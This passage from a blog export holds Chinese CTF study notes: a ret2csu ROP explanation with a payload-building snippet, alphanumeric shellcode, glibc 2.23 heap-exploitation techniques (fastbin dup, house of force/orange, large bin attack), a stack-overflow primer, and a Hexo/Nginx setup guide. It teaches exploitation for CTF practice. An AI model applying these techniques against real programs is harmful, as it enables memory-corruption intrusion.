<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>这两段能完成对<code>rdx</code>,<code>rsi</code>,<code>edi</code>的赋值，其实主要是对<code>rdx</code>，一般有直接对寄存器<code>rsi</code>,<code>rdi</code>赋值的gadget，而对于<code>rdx</code>则无。</p>
<p>需要注意的是寄存器<code>r12</code>,<code>r13</code>的内容，由于在gadget中有指令<code>cmp rbx,rbp;jnz short loc_xxxxxx</code>与<code>call qword ptr [r12+rbx*8]</code>，意思是程序将对<code>rbx，rbp</code>的内容进行比较，不同则跳转会首部再执行一次；从<code>r12+rbx*8</code>地址保存的指令开始执行。一般我们将r13置为0，则会通过cmp检测。而r12的值可以当作一次rip来进行写入。或者可以使用<code>_fini</code>中的指令，这一块的指令对于我们的操作是无害的，内容为：<code>sub rsp,8;add rsp,8</code>，<code>_fini</code>的地址存放在<strong>dynamic</strong>部分。</p>
<p>这里我放上自己的ret2csu.sublime-snippet，方便做题使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;snippet&gt;</span><br><span class="line">	&lt;content&gt;&lt;![CDATA[</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">r12,r13,r14,r15,system=<span class="number">0</span></span>):</span></span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    pop=$&#123;<span class="number">1</span>:pop&#125;</span><br><span class="line">    mov=$&#123;<span class="number">2</span>:mov&#125;</span><br><span class="line">    payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> system:</span><br><span class="line">        payload+=p32(pop)+p32(rbx)+p32(rbp)+p32(r12)+p32(r13)+p32(r14)+p32(r15)+p32(mov)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=p64(pop)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(mov)</span><br><span class="line">  	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload+=ret2csu($&#123;<span class="number">3</span>:system&#125;,$&#123;<span class="number">4</span>:rip&#125;,$&#123;<span class="number">5</span>:edi&#125;,$&#123;<span class="number">6</span>:rsi&#125;,$&#123;<span class="number">7</span>:rdx&#125;)</span><br><span class="line">]]&gt;&lt;/content&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a tabTrigger to define how to trigger the snippet --&gt;</span><br><span class="line">	&lt;tabTrigger&gt;ret2csu&lt;/tabTrigger&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a scope to limit where the snippet will trigger --&gt;</span><br><span class="line">	&lt;!-- &lt;scope&gt;source.python&lt;/scope&gt; --&gt;</span><br><span class="line">&lt;/snippet&gt;</span><br></pre></td></tr></table></figure>

<p>默认打包使用64位模式下的内存块大小，其中的pop指的是第二段gadget中的从<code>pop rbx</code>的地址，mov为第一段gadget的<code>mov rdx,r13</code>地址。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu使用Nginx+Hexo博客</title>
    <url>/2021/12/25/Ubuntu%E4%BD%BF%E7%94%A8Nginx-Hexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>基于hexo官方文档 <a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a> 和网上其他博主的搭建过程，照葫芦画瓢好不容易搭好了博客，回忆了一下自己的大概操作。</p>
<span id="more"></span>

<h1 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h1><p>我本地使用的也是ubuntu，以下就以ubuntu为例了</p>
<h2 id="安装必要程序"><a href="#安装必要程序" class="headerlink" title="安装必要程序"></a>安装必要程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br><span class="line">sudo apt install node.js</span><br><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>如果无法直接安装hexo可以更换npm源，以下是淘宝的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<h2 id="配置hexo"><a href="#配置hexo" class="headerlink" title="配置hexo"></a>配置hexo</h2><p>在任意路径下创建一个文件夹，然后进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>然后运行一次hexo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<p>然后在本地浏览器上，访问127.0.0.1:4000。如果hexo配置成功，则会出现hexo的默认页面。</p>
<p><img src="https://s2.loli.net/2021/12/25/MXljT2zv5BIY4wG.png" alt="default.png"></p>
<p>Ctrl+C结束后，继续进行配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd &lt;folder&gt;</span><br><span class="line">sudo _config.yml</span><br></pre></td></tr></table></figure>

<p>在配置文件中配置deploy用于一键部署，在文件最后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@&#x27;服务器ip&#x27;:&#x27;远程仓库路径&#x27;  # 远程仓库的创建在下文</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure>

<p>启动nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure>

<p>登陆服务器访问服务器，出现nginx测试页面则代表成功</p>
<h2 id="创建git用户"><a href="#创建git用户" class="headerlink" title="创建git用户"></a>创建git用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure>

<h2 id="创建远程仓库"><a href="#创建远程仓库" class="headerlink" title="创建远程仓库"></a>创建远程仓库</h2> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir /var/repo</span><br><span class="line">cd /var/repo</span><br><span class="line">sudo mkdir blog.git</span><br><span class="line">sudo chown -R git:git blog.git</span><br><span class="line">cd blog.git</span><br><span class="line">git init --bare</span><br></pre></td></tr></table></figure>

<h2 id="创建静态文件夹"><a href="#创建静态文件夹" class="headerlink" title="创建静态文件夹"></a>创建静态文件夹</h2><p>用来存放本地hexo文件夹中的public文件夹文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir /var/www/blog</span><br><span class="line">sudo chown -R git:git /var/www/blog</span><br></pre></td></tr></table></figure>

<h2 id="配置静态服务器访问路径"><a href="#配置静态服务器访问路径" class="headerlink" title="配置静态服务器访问路径"></a>配置静态服务器访问路径</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>

<p>更改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        listen [::]:80 default_server;</span><br><span class="line"></span><br><span class="line">        # SSL configuration</span><br><span class="line">        #</span><br><span class="line">        # listen 443 ssl default_server;</span><br><span class="line">        # listen [::]:443 ssl default_server;</span><br><span class="line">        #</span><br><span class="line">        # Note: You should disable gzip for SSL traffic.</span><br><span class="line">        # See: https://bugs.debian.org/773332</span><br><span class="line">        #</span><br><span class="line">        # Read up on ssl_ciphers to ensure a secure configuration.</span><br><span class="line">        # See: https://bugs.debian.org/765782</span><br><span class="line">        #</span><br><span class="line">        # Self signed certs generated by the ssl-cert package</span><br><span class="line">        # Don&#x27;t use them in a production server!</span><br><span class="line">        #</span><br><span class="line">        # include snippets/snakeoil.conf;</span><br><span class="line"></span><br><span class="line">        root /var/www/blog;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>然后重启nginx即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>

<h2 id="将本地机器上的ssh公钥填入authorized-keys文件"><a href="#将本地机器上的ssh公钥填入authorized-keys文件" class="headerlink" title="将本地机器上的ssh公钥填入authorized_keys文件"></a>将本地机器上的ssh公钥填入authorized_keys文件</h2><p>因为git是新用户，所以需要先生成自己的ssh公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>

<p>一直回车即可，然后在本地机器上查看ssh公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>复制后粘贴在服务器指定文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /home/git/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h2 id="配置git-hook"><a href="#配置git-hook" class="headerlink" title="配置git hook"></a>配置git hook</h2><p>进入远程仓库进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd hooks</span><br><span class="line">sudo vim post-receive</span><br></pre></td></tr></table></figure>

<p>填入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">  </span><br><span class="line">git --work-tree=/var/www/blog --git-dir=/var/repo/blog.git checkout -f</span><br><span class="line">#               &lt;静态文件地址&gt;        &lt;远程仓库地址&gt;</span><br></pre></td></tr></table></figure>

<p>最后赋予文件可执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x post-receive</span><br></pre></td></tr></table></figure>

<p>然后就可实现自动部署</p>
<p>最后，在本地打开hexo文件夹进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>然后浏览器访问远程服务器，如果出现hexo默认页面则代表成功。至此，搭建博客结束。</p>
]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>alphanumeric_shellcode</title>
    <url>/2022/02/08/alphanumeric-shellcode/</url>
    <content><![CDATA[<p>刷buu时做到一题限制了字符范围的题(mrctf2020_shellcode_revenge)。</p>
<span id="more"></span>

<p>需要使用alphanumeric shellcode(纯字符shellcode)。</p>
<p>就是使用纯字符对应的汇编指令完成shellcode的编写，比如：</p>
<table>
<thead>
<tr>
<th align="center">ASCII字符</th>
<th align="center">Hex</th>
<th align="center">汇编指令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">P</td>
<td align="center">0x50</td>
<td align="center">push %rax</td>
</tr>
<tr>
<td align="center">Q</td>
<td align="center">0x51</td>
<td align="center">push %rcx</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">0x52</td>
<td align="center">push %rdx</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">0x53</td>
<td align="center">push %rbx</td>
</tr>
<tr>
<td align="center">T</td>
<td align="center">0x54</td>
<td align="center">push %rsp</td>
</tr>
<tr>
<td align="center">U</td>
<td align="center">0x55</td>
<td align="center">push %rbp</td>
</tr>
<tr>
<td align="center">V</td>
<td align="center">0x56</td>
<td align="center">push %rsi</td>
</tr>
<tr>
<td align="center">W</td>
<td align="center">0x57</td>
<td align="center">push %rdi</td>
</tr>
<tr>
<td align="center">X</td>
<td align="center">0x58</td>
<td align="center">pop %rax</td>
</tr>
<tr>
<td align="center">Y</td>
<td align="center">0x59</td>
<td align="center">pop %rcx</td>
</tr>
<tr>
<td align="center">Z</td>
<td align="center">0x5a</td>
<td align="center">pop %rdx</td>
</tr>
</tbody></table>
<p>我们可以使用一些工具来进行编码。</p>
<p>详情如下：<a href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode">http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode</a></p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>how2heap_glibc_2.23</title>
    <url>/2022/04/11/how2heap-glibc-2-23/</url>
    <content><![CDATA[<p>待续</p>
<span id="more"></span>



<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>该demo通过分别释放不同的两个大小相等的堆，向我们展示了fastbin attack中的double_free。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>fastchunk被free之后会加入fastbin中，且在加入时会检查main_arena直接指向的地址(即链表头部)是否为当前释放的块。</p>
<p>因此当我们当前释放的堆不是最后释放时，无论是否被释放过都被释放。因此能够进行double-free，将该地址多次放入一条链中。</p>
<h3 id="相关源码"><a href="#相关源码" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// double free 检测，其中 old 为 fastbin 链首 chunk，也就是说，free fastchunk 时仅检测链首与释放 chunk</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>该demo利用了该函数在fastbin中的机制：</p>
<ol>
<li>清空fastbin(inuse位归0)</li>
<li>合并fastbin</li>
<li>若后一块地址不为top chunk，则将合并的堆加入unsortedbin</li>
</ol>
<p>触发该函数的操作是，申请一个足够大的chunk。demo中申请了一个0x400大小的chunk，之后可以查看到p1被加入到了unsorted bin中。由于fastbin被清空，因此可以继续释放，使用dup进行攻击。</p>
<h3 id="相关源码-1"><a href="#相关源码-1" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过触发 malloc_consolidate 来对 fast_bin 进行清除</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))&#123;…………&#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h4><p><a href="http://cn-sec.com/archives/285359.html">深度剖析malloc_consolidate</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>该demo展示了通过dup操作后，将一个内存块多次放入fastbin后的一次攻击示例。即将该块的用户空间的第一个地址(fd)改写为指定地址，通过申请相同大小就能申请到该空间。</p>
<p>但是要是想从fastbin中取出chunk，会对chunk_size进行检测，而该demo将栈上伪造的chunk的size也改了，因此才能申请成功。</p>
<h3 id="相关源码-2"><a href="#相关源码-2" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// chunk_size 的检测是通过调用 do_check_malloced_chunk </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><p>demo在栈上构造了一块chunk，并展示了将其成功释放后能够重新申请到。</p>
<p>程序中展示了构造一个fastchunk的过程，为了通过检测，主要是满足条件：</p>
<ul>
<li>fake_chunk的<code>ISMMAP</code>位不能为1</li>
<li>空间对齐</li>
<li>伪造next_size不能小于2*<code>SIZE_SZ</code>(16 on x64)，同时也不能大于<code>av-&gt;system_mem</code>(128kb by default for the main arena)</li>
</ul>
<p>可以看出，demo想说明的是：可以通过在指定位置构造fake_chunk来实现修改该地址的值。关键在于能够绕过对应的检测。</p>
<h2 id="相关源码-3"><a href="#相关源码-3" class="headerlink" title="相关源码"></a>相关源码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// next_size 检测</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">	    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">		  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">		  locked = <span class="number">1</span>;</span><br><span class="line">		  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">	      &#125;))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>



<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>利用top chunk的分配机制，实现任意地址分配。</p>
<p>demo展示了通过该技巧更改bss段上的一块地址的内容。</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
<li>能够控制top chunk的size域内容</li>
<li>能够自由控制分配大小</li>
</ol>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>从top chunk中申请内存时，过程中会调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure>

<p>(nb为用户的内存申请大小，victim为曾经top chunk的首地址)，最后实现效果为调整top chunk为减去偏移后的地址。</p>
<p>那么再更新av-&gt;top时就会将top chunk迁移到任意地址，然后再次从top chunk中申请时，就会申请到该地址空间。</p>
<p>但由于再申请前会进行一次检测，确定top chunk的大小足够分配这个大小。所以我们需要修改top chunk size为最大值(其本身为无符号数，因此为-1)即可。</p>
<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><p>demo展示了ptmalloc的机制：非fastchunk释放后会被放入unsortedbin中，而下次再次申请并在fastbin和unsortedbin中并没找到合适的chunk时，会将unsortedbin中的chunk按大小放入对应的bins中。</p>
<p>从smallbins中取chunk时，程序只会检查其bk-&gt;fd是否为当前chunk，而不会检查chunk_size。</p>
<p>并且在samllbin中，取出chunk的顺序是FILO，因此我们伪造bk为指定地址，则能够被申请到。</p>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><p>demo展示了ptmalloc的合并机制：释放chunk后会检测prev_inuse是否为0和prev_size是否满足(与绕过unlink检测差不多)，而这些与伪造的chunk(demo是在栈上伪造的)都成功的话就会先合并低地址再合并高地址chunk。合并是根据prev_size的长度来决定合并后chunk的首地址，且若高地址chunk为top chunk则会再与top chunk合并，而合并后top chunk的位置将会是之前我们伪造的chunk处，demo中为top  chunk因为合并到了栈上。</p>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>利用从top chunk中获取chunk的机制，不使用free函数就能达到得到一个free_chunk的功能。</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>当用户申请chunk，并且这个chunk需要从top chunk中获得时，如果遇到top chunk为不能满足能分配需求的大小时。会增大top chunk，根据arena的类型(main  arena与non main arena)的不同会采用不同的扩展方法。而之前的top chunk会被放入unsorted bin中。</p>
<p>demo伪造了top chunk size为 0xc01，伪造top chunk size的条件：</p>
<ul>
<li>size 必须要对齐到内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
</ul>
<p>然后申请 0x1000 大小的chunk，0x1000&gt;0xc01，因此top chunk 被放入了unsorted bin中。此时就类似于我们没有使用free函数就得到了一个位于unsorted bin中的chunk。</p>
<p>最后使用 <a href="http://116.205.191.26/2022/05/27/FSOP/">FSOP</a> 来 getshell。</p>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p>demo 演示了从 large_bin 中修改任意地址内容。</p>
<p>将 freed_largechunk 的 chunk_size 改为了 0x3f1, bk 改为 &amp;stack_val1-2, bk_nextsizes 改为了 stack_val2-4。</p>
<p>然后在执行 malloc(0x90) 时，修改了 stack_var1 与 stack_var2 的值。</p>
<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>在执行 malloc，并且是从 unsortedbin 中分配 chunk 时，会先将 unsortedbin 中的 chunk 插入到对应的 bins 下，然后再根据申请的大小从对应的 bins 中申请。</p>
<p>而该攻击是在 chunk 的插入过程中，由于没有对 bk 与 bk-&gt;nextsize 进行检查而产生的。</p>
<h3 id="相关源码-4"><a href="#相关源码-4" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>在代码中，我们可以看到会执行一个循环，且由于<strong>一个序列的 large bin chunk 中 fd_nextsize 的方向是 size 变小的方向</strong>，因此该循环是遍历找出比当前 size 大的最小 chunk，存入 fwd。</p>
<p>此时，因为我们的 chunk_size 改为了 0x3f1，就不用遍历了。</p>
<p>接着执行<code>victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code></p>
<p>由于我们将 p2-&gt;bk_nextsize 修改为了 &amp;stack_var2-4。因此，在 p3 的插入中会等同于执行了 p3-&gt;bk_nextsize=p2-&gt;bk_nextsize=&amp;stack_var2-4，p3-&gt;bk_nextsize-&gt;fd_nextsize=*(&amp;stack_var2-4+4)=p3。</p>
<p>接着执行<code>bck = fwd-&gt;bk;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;</code></p>
<p>因为也将 p2-&gt;bk 修改为了 &amp;stack_var1-2，因此等同于执行了 p3-&gt;bk=bck=p2-&gt;bk=&amp;stack_var1-2，p3-&gt;bk-&gt;fd=p2-&gt;bk-&gt;fd=*(&amp;stack_var1-2+2)=p3。</p>
<p>最后的结果为两个栈上地址的值都修改为了 p3 的地址。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
        <tag>heap</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title>stack overflow漏洞小结</title>
    <url>/2022/03/04/stack-overflow%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>以<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF Wiki</a>的目录为骨架，记录自己对栈溢出漏洞的理解。</p>
<span id="more"></span>

<p>对于CTF的pwn方向而言，我们实际上要做的就是通过一些漏洞来达到干扰程序的运行流程，以达到get shell或泄露敏感文件的内容的效果。</p>
<p>在介绍stack overflow漏洞之前，我们需要对栈有一个<a href="http://110.42.161.158/2022/03/04/%E6%A0%88%E4%BB%8B%E7%BB%8D/">基本的了解</a>。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>栈溢出指的是用户向栈中变量写入的长度超过了其本身的长度，导致其相邻栈数据被改写的情况。发生栈溢出的前提是：</p>
<ul>
<li>写入的位置在栈上</li>
<li>写入的长度没被良好的控制</li>
</ul>
<h2 id="相关危险函数"><a href="#相关危险函数" class="headerlink" title="相关危险函数"></a>相关危险函数</h2><p>通过上面提到的前提，我们知道要想利用栈溢出，则必须有用户输入的环节。包括的常见输入危险函数有：</p>
<ul>
<li> gets：从标准输入<code>stdin</code>中读取数据直到出现换行符或读到文件尾为止，最后加上NULL作为字符串结束。</li>
<li> scanf：从标准输入 stdin 读取格式化输入。</li>
</ul>
<p>以上函数均没有较好的限制长度，所以容易产生溢出漏洞。</p>
<p>除了输入环节，还有一些涉及到字符串赋值的环节也会产生栈溢出漏洞，包括的常见函数有：</p>
<ul>
<li> strcpy，字符串复制，遇到’\x00’停止</li>
<li> strcat，字符串拼接，遇到’\x00’停止</li>
</ul>
<p>遇到上面两个函数时，也会因为被赋值变量的长度不够而导致溢出。</p>
